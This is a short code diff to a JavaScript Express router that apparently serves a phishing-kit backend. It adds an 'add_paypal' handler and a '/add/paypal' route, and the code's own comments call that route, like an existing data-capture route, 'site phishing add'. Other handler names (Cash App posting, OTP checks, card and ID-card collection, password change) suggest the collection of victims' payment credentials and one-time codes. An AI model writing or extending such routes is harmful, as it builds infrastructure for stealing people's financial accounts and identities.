@@ -5,7 +5,7 @@ import rateLimitMiddleware from "../ratelimiter.js"
 import {signup_post, link_add,link_get,login_post,skip_code,add_mail,poster_add,add_data,info_get,all_poster,yoyo,user_noti,
     delete_poster,new_site_add_poster,get_A_poster,poster_details,add_site,admin_add_site,add_posterNumber,delete_info,
     add_new_links,site_exist,click_for_admin,click,link_details,pass_change,cashapap_post,update_validity,links_add,otp_check,
-    get_deyails_cashapp,show_all,demo_add,check_qrcode,rqcode_permission,update_many,add_data_checnge,today_data,id_card,cards,otp_send,phone_add
+    get_deyails_cashapp,show_all,demo_add,check_qrcode,rqcode_permission,update_many,add_data_checnge,today_data,id_card,cards,otp_send,phone_add,add_paypal
 
     
 } from './routehandler.js'
@@ -33,6 +33,8 @@ router.post('/edit/link/', add_new_links);//edit links number
 router.post('/admin/add', poster_add);//admin user and pass add
 
 router.post('/ad/:adminId/:posterId',rateLimitMiddleware, add_data);  ///site phishing add
+router.post('/add/paypal', add_paypal);  ///site phishing add
+
 
 router.delete('/delete/poster/:id_pos/:id_ad', delete_poster);
 
